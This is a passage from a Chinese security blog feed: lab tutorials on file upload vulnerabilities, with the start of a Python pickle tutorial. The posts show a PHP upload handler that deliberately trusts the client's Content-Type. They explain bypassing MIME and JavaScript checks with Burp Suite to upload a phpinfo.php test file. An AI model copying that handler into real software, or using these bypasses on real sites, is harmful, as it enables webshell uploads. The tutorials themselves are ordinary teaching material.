      <url>/2020/03/27/3.1%20%E6%9C%8D%E5%8A%A1%E7%AB%AFMIME%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h3 id="本文内容"><a href="#本文内容" class="headerlink" title="本文内容"></a>本文内容</h3><ul><li>文件头content-type字段校验（image/gif等）绕过</li></ul><a id="more"></a><h3 id="0x01-服务端一般检测的内容"><a href="#0x01-服务端一般检测的内容" class="headerlink" title="0x01 服务端一般检测的内容"></a>0x01 服务端一般检测的内容</h3><ul><li>上传的文件名（扩展名、黑白名单）</li><li>MIME/TYPE （浏览器根据文件扩展名自动生成）<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload01.png" alt="部分burpsuite截取的部分展示"></li></ul><h3 id="0x02-MIME了解"><a href="#0x02-MIME了解" class="headerlink" title="0x02 MIME了解"></a>0x02 MIME了解</h3><ul><li><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p></li><li><p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p></li><li><p>浏览器会自动根据所上传的文件的扩展名，对应到相应的MIME类型上</p></li><li><p>常见的白名单MIME/TYPE<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload02.png" alt=""></p></li></ul><h3 id="0x03-实例分析"><a href="#0x03-实例分析" class="headerlink" title="0x03 实例分析"></a>0x03 实例分析</h3><ul><li>环境：windows+phpstudy+burpsuite</li><li>由于本地127.0.0.1burpsuite截不到包故采用本地网络地址</li></ul><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = <span class="string">'uploads/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];          </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">$msg= <span class="string">"&lt;br/&gt;成功上传至:&lt;b&gt; "</span>.$img_path.<span class="string">"&lt;/b&gt;"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">"upload_panel"</span>&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line"></span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;h3&gt;上传区&lt;/h3&gt;</span><br><span class="line">            &lt;form enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span> onsubmit=<span class="string">"return checkFile()"</span>&gt;</span><br><span class="line">                &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">                &lt;input class="input_file" type="file" name="upload_file"/&gt;</span><br><span class="line">                &lt;input class="button" type="submit" name="submit" value="上传"/&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div id=<span class="string">"msg"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> </span><br><span class="line">                    <span class="keyword">if</span>($msg != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"提示："</span>.$msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=<span class="string">"img"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">if</span>($is_upload)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img_path.<span class="string">'" width="250px" /&gt;'</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ul><li><p>尝试上传一个含phpinfo的文件（phpinfo.php）<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload04.png" alt=""></p></li><li><p>使用burpsuite截断修改content-type，重新提交报文<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload05.png" alt=""></p></li><li><p>将burpsuite截断关闭，访问上传的文件<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload06.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 文件上传漏洞原理及利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（二）：前端检测绕过】2.2提交报文修改检测</title>
      <link href="/2020/03/26/2.2%20%E6%8F%90%E4%BA%A4%E6%8A%A5%E6%96%87%E4%BF%AE%E6%94%B9%E6%A3%80%E6%B5%8B/"/>
      <url>/2020/03/26/2.2%20%E6%8F%90%E4%BA%A4%E6%8A%A5%E6%96%87%E4%BF%AE%E6%94%B9%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>提交报文修改检测</li><li>绕过示例</li></ul><a id="more"></a><h3 id="0x01-提交报文修改检测（前端检测通用）"><a href="#0x01-提交报文修改检测（前端检测通用）" class="headerlink" title="0x01 提交报文修改检测（前端检测通用）"></a>0x01 提交报文修改检测（前端检测通用）</h3><ul><li><p>首先选择正常的文件进行上传</p></li><li><p>而后通过BurpSuite进行截包改包或改包重放完成文件上传</p><p>  这种方法前端绕过检测中通用，无需理会具体前端的检测代码，直接绕过前端进行上传报文的修改并提交</p></li></ul><h3 id="0x02-示例"><a href="#0x02-示例" class="headerlink" title="0x02 示例"></a>0x02 示例</h3><p>（1）环境<br>   <img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass01.png" alt=""></p><p>（2）选择本地一张含phpinfo()函数的图片（phpinfo.jpg）,使用burpsuite截包<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass06.png" alt=""></p><p>（3）burpsuite进行重放<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass07.png" alt=""></p><ul><li><p>原始<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass08.png" alt=""></p></li><li><p>修改后：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass09.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 文件上传漏洞原理及利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（二）：前端检测绕过】2.1客户端检测绕过</title>
      <link href="/2020/03/26/2.1%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/"/>
      <url>/2020/03/26/2.1%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>主要客户端检测绕过类型</li><li>前端js检测绕过示例</li></ul><a id="more"></a><h3 id="0x01-客户端检测绕过"><a href="#0x01-客户端检测绕过" class="headerlink" title="0x01 客户端检测绕过"></a>0x01 客户端检测绕过</h3><p>（1）JavaScript检测：通过浏览器提交上传请求前，触发检测用JS脚本进行检测。</p><pre><code>例如：普通的表单上传</code></pre><p>（2）Flash AS脚本检测：上传用Flash，提交上传请求前，触发检测用AS脚本进行检测。</p><pre><code>例如:DZ的头像上传</code></pre><p>（3）APP上传检测：检测写在APP客户端代码中，或者所调用的HTML页面中</p><ul><li>客户端检测一般只检测文件扩展名<blockquote><p>客户端进行的检测，可通过对客户端代码的一些修改或直接拦截修改报文即可绕过，所以这种上传限制约等于没有</p></blockquote></li></ul><h3 id="0x02-前端JavaScript检测绕过"><a href="#0x02-前端JavaScript检测绕过" class="headerlink" title="0x02 前端JavaScript检测绕过"></a>0x02 前端JavaScript检测绕过</h3><ul><li>查看onchange、onsubmit等事件<ul><li>onchange事件会在域的内容改变时发生</li><li>onsubmit事件会在表单中的确认按钮被点击时发生</li></ul></li><li>删除掉相关事件中的检测函数</li></ul><h3 id="0x03-测试案例"><a href="#0x03-测试案例" class="headerlink" title="0x03 测试案例"></a>0x03 测试案例</h3><p>（1）环境</p><pre><code>windows+phpstudy+uploadlab</code></pre><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass01.png" alt=""></p><p>（2）尝试上传含phpinfo()函数的php文件（phpinfo.php）</p><p>   <img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass02.png" alt=""></p><p>（3）F12审查元素代码，找到事件触发函数<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass03.png" alt=""></p><p>（4）删除onsubmit，重新提交，并访问上传的文件<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass04.png" alt=""></p><p>（5）查看网页源代码可找到上传文件路径相关信息<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass05.png" alt=""></p><p>（6）js校验代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">            alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 文件上传漏洞原理及利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（一）】1.1文件上传漏洞原理及流程</title>
      <link href="/2020/03/25/1.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B/"/>
      <url>/2020/03/25/1.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>文件上传流程、漏洞原因</li><li>burpsuite简单安装</li><li>dvwa文件上传简单示例</li></ul><a id="more"></a><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>流程：</p><ul><li>1.前端选择文件，进行提交</li><li>2.浏览器形成POST MultiPart报文发送到服务器</li><li>3.服务器中间件接收到报文，解析后交给相关后端代码进行处理</li><li>4.后端代码将上传的文件内容写入到临时文件中（PHP特有）</li><li>5.写入到文件中，文件名为提交的文件名或以一定规则生成的文件名</li></ul><h3 id="文件上传漏洞产生原因"><a href="#文件上传漏洞产生原因" class="headerlink" title="文件上传漏洞产生原因"></a>文件上传漏洞产生原因</h3><ul><li>文件上传未对上传的文件进行严格的验证和过滤，容易造成任意文件上传，包括上传动态文件（asp/php/jsp等等）</li><li>如果上传的目标目录没有限制执行权限，导致上传的动态文件（比如：webshell）可以正常执行并且可以访问，即造成了文件上传漏洞。</li></ul><h3 id="存在上传漏洞的必要条件"><a href="#存在上传漏洞的必要条件" class="headerlink" title="存在上传漏洞的必要条件"></a>存在上传漏洞的必要条件</h3><ul><li>存在上传点</li><li>可以上传动态文件</li><li>上传目录有执行权限，并且上传的文件可执行</li><li>可访问到上传的动态文件</li></ul><h3 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330upload04.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330upload05.png" alt=""></p><h3 id="BurpSuite简单安装"><a href="#BurpSuite简单安装" class="headerlink" title="BurpSuite简单安装"></a>BurpSuite简单安装</h3><ul><li>下载jdk</li><li>官网下载Burp Suite 2.1 </li><li>参考链接：<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=54760&amp;highlight=burpsuite" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=54760&amp;highlight=burpsuite</a></li></ul><ul><li><p>简单代理配置</p><ul><li><p>火狐浏览器：选项-》网络设置-》设置<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330burpsuite01.png" alt=""></p></li><li><p>burpsuite设置：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330burpsuite02.png" alt=""></p></li></ul></li></ul><h3 id="使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行）"><a href="#使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行）" class="headerlink" title="使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行）"></a>使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行）</h3><ul><li><p>在火狐浏览器url栏输入：about:config</p></li><li><p>然后在搜索栏输入：network.proxy.allow_hijacking_localhost<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330burpsuite03.png" alt=""></p></li></ul><h3 id="dvwa文件上传low简单示例"><a href="#dvwa文件上传low简单示例" class="headerlink" title="dvwa文件上传low简单示例"></a>dvwa文件上传low简单示例</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330upload01.png" alt=""></p><ul><li>burpsuite截包<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330upload02.png" alt=""></li></ul><h3 id="使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式）"><a href="#使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式）" class="headerlink" title="使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式）"></a>使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式）</h3><ul><li>将代理都修改为端口9999</li><li>测试：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload01.png" alt=""></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 文件上传漏洞原理及利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python序列化数据之pickle详解</title>
      <link href="/2020/03/15/python%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E4%B9%8Bpickle%E8%AF%A6%E8%A7%A3/"/>
      <url>/2020/03/15/python%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E4%B9%8Bpickle%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>学习python之pickle详解</p><a id="more"></a><h4 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h4><ul><li><p>便于存储（序列化过程：将文本信息转为==二进制数据流，易存储在硬盘中==）</p></li><li><p>反序列化从硬盘读取的数据，可得到原始数据</p></li><li><p>python程序运行中得到的字符串、列表等数据，要长久保存，方便之后使用（pickle模块可以将对象转换为已知可以传输或存储的格式）</p></li><li><p>python中序列化和反序列化</p><ul><li><p>将Python对象转换为二级制形式叫做序列化（Pickling）</p></li><li><p>将二进制数据流恢复为Python对象叫做反序列化（Unpickling）</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A01/python_pickle.png" alt="python序列化反序列化"></p></li></ul><h4 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h4><ul><li><p>提供了一个简单的==持久化==功能，可以将对象以==文件==形式存放在磁盘上</p></li><li><p>只能在python中使用，可以序列化python中几乎所有的数据类型（列表、字典…）</p></li><li><p>pickle序列化后的数据，可读性差</p></li><li><p>pickle序列化和反序列化示例</p><ul><li><p>819pickling_unpickling_example.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="comment"># 定义类Part</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    number = <span class="number">0</span></span><br><span class="line">    name   = <span class="string">""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, number, name)</span>:</span></span><br><span class="line">        self.number  = number</span><br><span class="line">        self.name    = name</span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Part Number: %d"</span>%(self.number))</span><br><span class="line">        print(<span class="string">"Part Name: %s"</span>%(self.name))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 实例化part</span></span><br><span class="line">part1=Part(<span class="number">111</span>, <span class="string">"Spindle"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a file to store the pickled object</span></span><br><span class="line"><span class="comment"># 创建文件存储pickled对象</span></span><br><span class="line">objectRepository = open(<span class="string">"ObjectFile.picl"</span>, <span class="string">"wb"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Pickle/serialize the python object and store the bytes into a binary file</span></span><br><span class="line"><span class="comment"># 序列化Python对象并存储为二进制字节流</span></span><br><span class="line">pickle.dump(part1, objectRepository, protocol=pickle.HIGHEST_PROTOCOL)</span><br><span class="line">objectRepository.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Unpickle/de-serialize the python object and print the attributes of the object</span></span><br><span class="line"><span class="comment"># 反序列化Python对象并打印对象属性</span></span><br><span class="line">objectRepository    = open(<span class="string">"ObjectFile.picl"</span>, <span class="string">"rb"</span>,);</span><br><span class="line">reconstructedObject = pickle.load(objectRepository)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Print object attributes</span></span><br><span class="line"><span class="comment"># 打印对象属性</span></span><br><span class="line">reconstructedObject.identify()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">- 运行结果：</span><br></pre></td></tr></table></figure><p>  (venv) yuhao@fishmouse:~/Envs/venv/project$ python 819pickling_unpickling_example.py<br>  Part Number: 111<br>  Part Name: Spindle</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 序列化的数据</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;python</span><br><span class="line">  &gt;&gt;&gt; with open(&#39;ObjectFile.picl&#39;,&#39;rb&#39;) as f:</span><br><span class="line">  ...     f.read()</span><br><span class="line">  ... </span><br><span class="line">  b&#39;\x80\x04\x959\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Part\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x06number\x94Ko\x8c\x04name\x94\x8c\x07Spindle\x94ub.&#39;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>==序列化==语法</p><ul><li><p><a href="https://pythontic.com/modules/pickle/dump" target="_blank" rel="noopener">pickle.dump参考链接</a></p></li><li><p>pickle.dump(obj,file[,protocol])</p><ul><li>序列化对象，将结果数据流写入到文件对象或者buffer中</li></ul></li><li><p>参数protocol是序列化模式，一共有5种不同的类型，即（0,1,2,3,4）；</p><ul><li>（0,1,2）早期的版本，默认值为0（表示以文本形式序列化），值为1或2（表示以二级制的形式序列化）；</li><li>（3,4）则是python3之后的版本</li><li>查看（3,4）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.HIGHEST_PROTOCOL</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.DEFAULT_PROTOCOL</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></li><li><p>pickle.dump()：转换的字节流写入buffer中</p><ul><li><p>示例：819pickle_dump_example.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span>:</span></span><br><span class="line">    title       = <span class="string">""</span></span><br><span class="line">    isbn        = <span class="string">""</span></span><br><span class="line">    parts       = <span class="literal">None</span></span><br><span class="line">    chapters    = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, title, isbn, parts, chapters)</span>:</span></span><br><span class="line">        self.title      = title</span><br><span class="line">        self.isbn       = isbn</span><br><span class="line">        self.parts      = parts</span><br><span class="line">        self.chapters   = chapters</span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Title of the book: %s"</span>%(self.title))</span><br><span class="line">        print(<span class="string">"ISBN of the book: %s"</span>%(self.isbn))</span><br><span class="line">        print(<span class="string">"Parts are:"</span>)</span><br><span class="line">        <span class="keyword">for</span> part <span class="keyword">in</span> self.parts:</span><br><span class="line">            print(part)</span><br><span class="line">        print(<span class="string">"Chapters are:%s"</span>%(self.chapters))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    partName     = <span class="string">""</span></span><br><span class="line">    beginChapter = <span class="number">-1</span></span><br><span class="line">    endChapter   = <span class="number">-1</span></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, partName, beginChapter, endChapter)</span>:</span></span><br><span class="line">        self.partName     = partName</span><br><span class="line">        self.beginChapter = beginChapter</span><br><span class="line">        self.endChapter   = endChapter</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        stringRep =  <span class="string">"%s"</span>%(self.partName)       </span><br><span class="line">        <span class="keyword">return</span> stringRep</span><br><span class="line"></span><br><span class="line">part1 = Part(<span class="string">"Part 1"</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line">part2 = Part(<span class="string">"Part 